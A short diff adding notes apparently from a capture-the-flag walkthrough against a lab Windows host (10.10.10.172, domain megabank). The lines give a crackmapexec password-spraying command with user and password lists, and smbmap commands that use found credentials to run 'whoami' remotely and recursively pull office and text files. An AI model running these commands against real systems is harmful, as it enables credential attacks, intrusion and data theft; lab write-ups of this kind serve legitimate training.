@@ -1,0 +1,5 @@
+crackmapexec smb 10.10.10.172 -d megabank -u users.txt -p english-basic.txt
+use smbmap to enumerate the remote file shares, which lists our
+permissions.
+smbmap -u SABatchJobs -p SABatchJobs -d megabank -H 10.10.10.172 -x whoami
+smbmap -u SABatchJobs -p SABatchJobs -d megabank -H 10.10.10.172 -A '(xlsx|docx|txt|xml)' -R
